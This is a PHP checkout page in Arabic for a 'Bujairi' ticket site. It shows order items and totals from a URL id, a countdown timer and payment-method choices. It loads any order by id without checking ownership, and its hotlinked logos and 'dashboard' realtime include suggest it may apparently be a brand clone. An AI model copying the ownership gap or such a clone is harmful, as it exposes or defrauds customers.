<?php
declare(strict_types=1);
require __DIR__ . '/../dashboard/init.php';
auth_require_customer_login_or_redirect();
$id = (int) ($_GET['id'] ?? 0);
$order = order_by_id(bujairi_pdo(), $id);
if (!$order) {
    http_response_code(404);
    echo 'الطلب غير موجود';
    exit;
}
$items = order_items(bujairi_pdo(), $id);
$total = 0.0;
foreach ($items as $i) {
    $total += (float) $i['line_total'];
}
$pageTitle = 'إتمام الشراء';
$useTailwind = true;
?><!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo h($pageTitle); ?></title>
    <link rel="icon" href="https://s3.ticketmx.com/bujairi/images/favicon.ico">
    <link rel="stylesheet" href="https://s3.ticketmx.com/fonts/NeoSansArabic/NeoSansArabic.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>tailwind.config = { theme: { extend: { colors: { bujairi: '#a68b5a' } } } };</script>
    <link rel="stylesheet" href="<?php echo h(url('assets/css/pages.css')); ?>">
</head>
<body class="text-slate-800 flex flex-col min-h-screen checkout">
<nav class="bg-white border-b border-gray-100">
    <div class="container mx-auto px-4 py-3 flex items-center justify-between">
        <a href="<?php echo h(url('index.php')); ?>"><img src="https://s3.ticketmx.com/bujairi/images/bujairi-ar.svg" alt="Bujairi" class="h-10"></a>
    </div>
</nav>
<header class="bg-white border-b border-gray-100 py-4 shadow-sm">
    <div class="container mx-auto px-4 flex flex-col lg:flex-row items-center justify-between gap-4">
        <h1 class="text-xl font-bold">إتمام الشراء</h1>
        <ul class="steps-container">
            <li class="active">تسجيل دخول</li>
            <li class="active">اختيار التذاكر</li>
            <li class="active">إتمام الشراء</li>
        </ul>
    </div>
</header>
<main class="flex-grow container mx-auto px-4 py-8">
    <div class="max-w-4xl mx-auto grid grid-cols-1 lg:grid-cols-3 gap-8">
        <div class="lg:col-span-2 space-y-6">
            <div class="bg-amber-50 border border-amber-100 rounded-2xl p-4 flex items-center gap-4 text-amber-800">
                <div class="timer-badge bg-amber-200 p-2 rounded-lg">⏳</div>
                <p class="text-sm font-bold">الوقت المتاح: <span id="countdown" class="font-mono text-lg">10:00</span></p>
            </div>
            <div class="bg-white rounded-3xl shadow-sm border border-gray-100 overflow-hidden">
                <div class="bg-slate-900 px-6 py-4 text-white font-bold">ملخص السلة</div>
                <div class="p-6">
                    <?php foreach ($items as $it): ?>
                        <div class="flex flex-col md:flex-row gap-4 pb-6 border-b border-gray-100">
                            <div class="flex-grow">
                                <h3 class="font-bold text-lg"><?php echo h($it['title']); ?></h3>
                                <p class="text-sm font-bold mt-4">الكمية: <?php echo (int) $it['guests']; ?></p>
                            </div>
                            <div class="text-left md:text-right text-xl font-bold text-bujairi"><?php echo h((string) $it['line_total']); ?> ريال</div>
                        </div>
                    <?php endforeach; ?>
                    <div class="flex items-center justify-between pt-6">
                        <span class="text-xl font-bold">الإجمالي</span>
                        <span class="text-2xl font-bold"><?php echo h((string) $total); ?> ريال</span>
                    </div>
                </div>
            </div>
        </div>
        <div class="lg:col-span-1">
            <form method="post" action="<?php echo h(url('booking/payment-method.php')); ?>" class="bg-white rounded-3xl shadow-sm border border-gray-100 p-6">
                <input type="hidden" name="id" value="<?php echo (int) $order['id']; ?>">
                <h4 class="font-bold mb-6">طريقة الدفع</h4>
                <div class="space-y-3">
                    <label class="payment-card flex items-center justify-between gap-3 p-4 rounded-2xl border-2">
                        <span class="flex items-center gap-3 min-w-0 flex-1">
                            <img src="https://cdn2.downdetector.com/static/uploads/logo/apple-pay.png" alt="" class="h-9 w-auto object-contain shrink-0" width="120" height="48" loading="lazy">
                            <span class="text-sm font-bold">Apple Pay</span>
                        </span>
                        <input type="radio" name="method" value="Apple Pay" class="shrink-0">
                    </label>
                    <label class="payment-card selected flex items-center justify-between gap-3 p-4 rounded-2xl border-2">
                        <span class="flex items-center gap-3 min-w-0 flex-1">
                            <img src="<?php echo h(url('assets/cards-DEvwsDKR.webp')); ?>" alt="" class="h-9 w-auto object-contain shrink-0" width="120" height="48" loading="lazy">
                            <span class="text-sm font-bold">البطاقة</span>
                        </span>
                        <input type="radio" name="method" value="Credit Card" checked class="shrink-0">
                    </label>
                    <label class="payment-card flex items-center justify-between gap-3 p-4 rounded-2xl border-2">
                        <span class="flex items-center gap-3 min-w-0 flex-1">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/Stc_pay.svg/1280px-Stc_pay.svg.png" alt="" class="h-9 w-auto object-contain shrink-0 max-w-[100px]" width="100" height="36" loading="lazy">
                            <span class="text-sm font-bold">STC Pay</span>
                        </span>
                        <input type="radio" name="method" value="STC Pay" class="shrink-0">
                    </label>
                </div>
                <p id="payUnavailableMsg" class="hidden mt-3 text-sm text-amber-900 bg-amber-50 border border-amber-200 rounded-xl px-3 py-2" role="status">طريقة الدفع هذه غير متوفرة حالياً</p>
                <button type="submit" id="checkoutPaySubmit" class="w-full mt-8 py-4 bg-bujairi hover:bg-amber-800 text-white font-bold rounded-xl disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:bg-bujairi">تأكيد الدفع</button>
            </form>
        </div>
    </div>
</main>
<footer class="bg-white border-t border-gray-100 py-6 mt-12 text-xs text-gray-400 text-center">
    Copyright 2024 DGCL
</footer>
<script src="<?php echo h(url('assets/js/checkout.js')); ?>"></script>
<?php require __DIR__ . '/../dashboard/booking-realtime-script.php'; ?>
</body>
</html>
